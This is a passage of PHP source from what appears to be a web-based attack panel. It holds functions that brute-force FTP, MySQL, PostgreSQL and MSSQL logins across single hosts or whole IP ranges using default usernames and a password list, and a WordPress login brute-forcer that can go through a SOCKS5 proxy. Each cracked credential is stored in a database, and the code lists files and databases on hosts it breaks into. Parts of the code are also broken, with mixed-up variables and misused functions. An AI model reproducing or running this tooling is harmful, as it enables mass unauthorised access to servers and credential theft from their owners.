            $pwds = $passes;
        }

        $ftpconn = ftp_connect($_POST['shost']);
        if(ftp_login($ftpconn, 'anonymous', '')) {
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', 'anonymous')", $conn);
        ssh2_exec($sshconn, 'exit');
            echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
            echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
                echo $plik.'<br />';
            }
            ftp_close($ftpconn);
        } else {
            echo '<br /><p>FTP anonymous login not allowed.<p/>';
            ftp_close($ftpconn);
        }


      if($_POST['suser'] != '') {
                echo '<br /><p>Bruteforcing...</p>'; 
                foreach ($pwds as $haslo){
                    $ftpconn = ftp_connect($_POST['shost']);
                        if(ftp_login($ftpconn, $_POST['suser'], $haslo)) {
        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
        ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
            echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
            echo '<p>Files in directory:</p> <br />';
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
            echo $plik.'<br />';
            }
             ftp_close($ftpconn);
             break;
                        } else {
        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
                        }
                }
        } else {
            echo '<p>FTP user is not defined, wont bruteforce.</p>';
        }

        } else { 
        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - FTP seems not working (21).';
        }


    echo '</div></div>';

    }

    elseif(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {

    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Massive FTP attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 2) {
        echo 'yes</p>';
    } else {
        echo 'no</p>';
    }

    $ips = explode('-', $_POST['mhost']);

    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {
               if($checkftp = fsockopen(long2ip($ip), 21, $errno, $errstr, 5)) {
        echo '<br /><b>&raquo;</b> <b>'.htmlspecialchars(long2ip($ip)).'</b> - FTP found on port 21.<br />';

        if($_POST['wordlist'] == 1) {

            if(file_exists($_POST['spath'])) {
                $pwds = file($_POST['spath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
            $pwds = $passes;
        }

        $ftpconn = ftp_connect(long2ip($ip));

      if($_POST['muser'] != '') {
                echo '<p>Bruteforcing...</p>'; 
                foreach ($pwds as $haslo){
                    $ftpconn = ftp_connect(long2ip($ip));
                        if(ftp_login($ftpconn, $_POST['muser'], $haslo)) {
        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
        ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
            echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
            echo '<p>Files in directory:</p> <br />';
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
            echo $plik.'<br />';
            }
             ftp_close($ftpconn);
             break;
                        } else {
        echo " - <font color=\"#990000\">" . htmlspecialchars(long2ip($ip)) . ':' . htmlspecialchars($haslo) . "</font><br />";
                        }
                }
        } else {
            echo '<p>FTP user is not defined, wont bruteforce.</p>';
        }

        if(ftp_login($ftpconn, 'anonymous', '')) {
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', 'anonymous')", $conn);
        ssh2_exec($sshconn, 'exit');
            echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
            echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
            foreach ($ftpfiles as $plik) {
                echo $plik.'<br />';
            }
            ftp_close($ftpconn);
        } else {
            echo '<p>FTP anonymous login not allowed.<p/>';
            ftp_close($ftpconn);
        }

    }
}

    echo '</div></div>';

    }

mysqli_close($conn);

}

function brute_dbs() {

$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
$connf = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysqli_select_db(SQL_DB, $connf);

    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {

    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Single Database attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 1) {
        echo 'yes &nbsp;&bull;&nbsp; ';
    } else {
        echo 'no &nbsp;&bull;&nbsp; ';
    }
    echo 'Target: ';
    if(isset($_POST['smysql'])) {
        echo 'MySQL ';
    }
    if(isset($_POST['smssql'])) {
        echo 'MsSQL ';
    }
    if(isset($_POST['spgsql'])) {
        echo 'PgSQL ';
    } elseif(!isset($_POST['smysql']) && !isset($_POST['smssql']) && !isset($_POST['spgsql'])) {
        echo 'None selected';
        $none = TRUE;
    }

        if($_POST['wordlist'] == 1) {

            if(file_exists($_POST['spath'])) {
                $pwds = file($_POST['spath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
            $pwds = $passes;
        }

    echo '<br /><h3>&raquo; '.htmlspecialchars($_POST['shost']).'</h3>';


    if(isset($_POST['smysql'])) {

        $checksql = fsockopen($_POST['shost'], 3306, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> MySql found on port 3306. Bruteforcing...</p>';

        if($_POST['suser'] == '') {
        $uzytkownik = 'root';
        } else {
        $uzytkownik = $_POST['suser'];
        }

        foreach ($pwds as $haslo){
        $conn = mysqli_connect($_POST['shost'], $uzytkownik, $haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);

        $dbuser = mysqli_query($conn,"SELECT USER();");
        $dbuzer = mysql_fetch_row($dbuser);
        $dbdb = mysqli_query($conn,"SELECT DATABASE();");
        $dbd = mysql_fetch_row($dbdb);
        echo '<b>General info</b><br />';
        echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
        echo 'Host info - '.mysql_get_host_info().'<br />';
        echo 'Current user - '.$dbuzer[0].'<br />';

        echo '<br /><b>Databases</b><br />';
        $res = mysqli_query($conn,"SHOW DATABASES");

    while ($row = mysqli_fetch_assoc($res)) {
        echo $row['Database'] . "<br />";
    }

        mysqli_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> MySql seems not working (3306).</p>';
    }

    }

    if(isset($_POST['spgsql'])) {

        $checksql = fsockopen($_POST['shost'], 5432, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> PgSql found on port 5432. Bruteforcing...</p>';

        if($_POST['suser'] == '') {
        $uzytkownik = 'postgres';
        } else {
        $uzytkownik = $_POST['suser'];
        }

        foreach ($pwds as $haslo){
        $conn = pg_connect("host=".$_POST['shost']." user=".$uzytkownik." password=".$haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
        echo '<br /><b>General info</b><br />';
        echo 'Version - '.pg_version($conn).'<br />';
        echo 'Host - '.pg_host($conn).'<br />';
        pg_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> PgSql seems not working (5432).</p>';
    }

    }

        if(isset($_POST['smssql'])) {

        $checksql = fsockopen($_POST['shost'], 1433, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> MsSql found on port 1433. Bruteforcing...</p>';

        if($_POST['suser'] == '') {
        $uzytkownik = 'sa';
        } else {
        $uzytkownik = $_POST['suser'];
        }

        foreach ($pwds as $haslo){
        $conn = mssql_connect($_POST['shost'], $uzytkownik, $haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
        mssql_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> MsSql seems not working (1433).</p>';
    }

    }

    echo '</div></div>';

    }

    if(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {

    echo '<div class="post">';
    echo '<h2 class="title"><a href="#">Results</a></h2>';
    echo '<div class="entry">';
    echo '<p class="meta"> Massive Database\'s attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
    if(isset($_POST['wordlist']) == 2) {
        echo 'yes &nbsp;&bull;&nbsp; ';
    } else {
        echo 'no &nbsp;&bull;&nbsp; ';
    }
    echo 'Target: ';
    if(isset($_POST['mmysql'])) {
        echo 'MySQL ';
    }
    if(isset($_POST['mmssql'])) {
        echo 'MsSQL ';
    }
    if(isset($_POST['mpgsql'])) {
        echo 'PgSQL ';
    } elseif(!isset($_POST['mmysql']) && !isset($_POST['mmssql']) && !isset($_POST['mpgsql'])) {
        echo 'None selected';
        $none = TRUE;
    }

        if($_POST['wordlist'] == 1) {

            if(file_exists($_POST['spath'])) {
                $pwds = file($_POST['spath']);
            } else {
                echo '<p>File not found... Using default passwords.</p>';
                $pwds = $passes;
            }

        } else {
            $pwds = $passes;
        }

    $ips = explode('-', $_POST['mhost']);

    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {

       echo '<br /><h3>&raquo; '.htmlspecialchars(long2ip($ip)).'</h3>';


    if(isset($_POST['mmysql'])) {

        $checksql = fsockopen(long2ip($ip), 3306, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> MySql found on port 3306. Bruteforcing...</p>';

        if($_POST['muser'] == '') {
        $uzytkownik = 'root';
        } else {
        $uzytkownik = $_POST['muser'];
        }

        foreach ($pwds as $haslo){
        $conn = mysqli_connect(long2ip($ip), $uzytkownik, $haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);

        $dbuser = mysqli_query($conn,"SELECT USER();");
        $dbuzer = mysql_fetch_row($dbuser);
        $dbdb = mysqli_query($conn,"SELECT DATABASE();");
        $dbd = mysql_fetch_row($dbdb);
        echo '<b>General info</b><br />';
        echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
        echo 'Host info - '.mysql_get_host_info().'<br />';
        echo 'Current user - '.$dbuzer[0].'<br />';

        echo '<br /><b>Databases</b><br />';
        $res = mysqli_query($conn,"SHOW DATABASES");

    while ($row = mysqli_fetch_assoc($res)) {
        echo $row['Database'] . "<br />";
    }

        mysqli_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> MySql seems not working (3306).</p>';
    }

    }

    if(isset($_POST['mpgsql'])) {

        $checksql = fsockopen(long2ip($ip), 5432, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> PgSql found on port 5432. Bruteforcing...</p>';

        if($_POST['muser'] == '') {
        $uzytkownik = 'postgres';
        } else {
        $uzytkownik = $_POST['muser'];
        }

        foreach ($pwds as $haslo){
        $conn = pg_connect("host=".long2ip($ip)." user=".$uzytkownik." password=".$haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
        echo '<br /><b>General info</b><br />';
        echo 'Version - '.pg_version($conn).'<br />';
        echo 'Host - '.pg_host($conn).'<br />';
        pg_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> PgSql seems not working (5432).</p>';
    }

    }

        if(isset($_POST['mmssql'])) {

        $checksql = fsockopen(long2ip($ip), 1433, $errno, $errstr, 5);
            if($checksql){
        echo '<br /><p><b>[+]</b> MsSql found on port 1433. Bruteforcing...</p>';

        if($_POST['muser'] == '') {
        $uzytkownik = 'sa';
        } else {
        $uzytkownik = $_POST['muser'];
        }

        foreach ($pwds as $haslo){
        $conn = mssql_connect(long2ip($ip), $uzytkownik, $haslo);
            if ($conn)  {
        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
        mssql_close($conn);
        break;
            } else {
        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
        }
        }

    
    } else {
        echo '<p><b>[-]</b> MsSql seems not working (1433).</p>';
    }

    }

    }

    echo '</div></div>';

    }
    mysqli_close($conn);
}

function url_exists($strURL)
{
    $resURL = curl_init();
    if(USE_PROXY == 1) {
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
    }
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
    else{return true ;}
}
function filter($string)
{
    if(get_magic_quotes_gpc() != 0){return stripslashes($string);    }
    else{return $string;    }
}
function RemoveLastSlash($host)
{
    if(strrpos($host, '/', -1) == strlen($host)-1)
    {return substr($host,0,strrpos($host, '/', -1));}
    else{return $host;}
}


function wp_brute() {
    if(isset($_POST['hosts']) && isset($_POST['passwords']) && isset($_POST['usernames']))
{
    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
    mysqli_select_db(SQL_DB, $conn);

    $hosts = trim(filter($_POST['hosts']));
    $passwords = trim(filter($_POST['passwords']));
    $usernames = trim(filter($_POST['usernames']));

    if($passwords && $usernames && $hosts)
    {
        $hostsx = explode("\n", $hosts);
        $usersx = explode("\n", $usernames);
        $passsx = explode("\n", $passwords);

        echo '<div class="post">';
        echo '<h2 class="title"><a href="#">Results</a></h2>';
        echo '<div class="entry">';
        echo '<p class="meta"> Wordpress CMS Bruteforce &nbsp;&bull;&nbsp; Broken credentials will be stored in database';


        foreach($hostsx as $host)
        {
            $host = RemoveLastSlash($host);
            $hxd = 0;
            $host = str_replace(array("http://","https://","www."),"",trim($host));
            $host = "http://".$host;
            $wpAdmin = $host.'/wp-admin/';

            if(!url_exists($host."/wp-login.php"))
            {echo "<p>".$host." - <font color='#990000'>Login page not found</font></p>";ob_flush();flush();continue;}

            foreach($usersx as $username)
            {
                foreach($passsx as $password)
                {
                    $ch   =     curl_init();
                        if(USE_PROXY == 1) {
                     curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                     curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
                                            }
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
                    curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
                    curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
                    curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
                    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
                    curl_setopt($ch,CURLOPT_POST,TRUE);
                    curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
                    $login    =       curl_exec($ch);


                    if(eregi ("profile.php",$login) )
                    {
                        $hxd = 1;
                        echo "<p>".$host." - Cracked! Username - <font color='#990000'>".$username."</font> & Password : <font color='#990000'>".$password."</font></p>";
                        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($host).":80', '".mysql_escape_string($username).":".mysql_escape_string($password)."')", $conn);
                        ob_flush();flush();break;
                    }
                }
                if($hxd == 1){break;}
            }
            if($hxd == 0)
            {echo "<p>".$host." - <font color='#990000'>Failed</font></p>";ob_flush();flush();}
        }
    echo '</div></div>';
    }
    else {echo "<h2><font color='#990000'>All fields are required!</font></h3>";}
}
mysqli_close($conn);
}


//Startups

checksql();

?>
